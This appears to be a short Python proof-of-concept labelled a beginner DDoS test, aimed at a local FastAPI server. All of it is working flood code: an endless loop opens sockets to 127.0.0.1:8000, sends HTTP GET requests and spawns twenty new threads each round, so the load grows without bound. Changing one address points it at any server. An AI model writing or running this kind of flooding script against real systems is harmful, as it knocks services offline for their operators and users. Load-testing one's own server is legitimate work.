#PoC beginner level ddos attack test using fastapi
import socket
import threading

attack_num=0

def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 8000))
        s.send(b'GET / HTTP/1.1\r\nHost:127.0.0.1\r\n\r')
        resp=s.recv(4096)
        
        global attack_num
        attack_num += 1
        print('Attack number', attack_num)
        s.close()
        
        for i in range(20):
            thread=threading.Thread(target=attack)
            thread.start()




            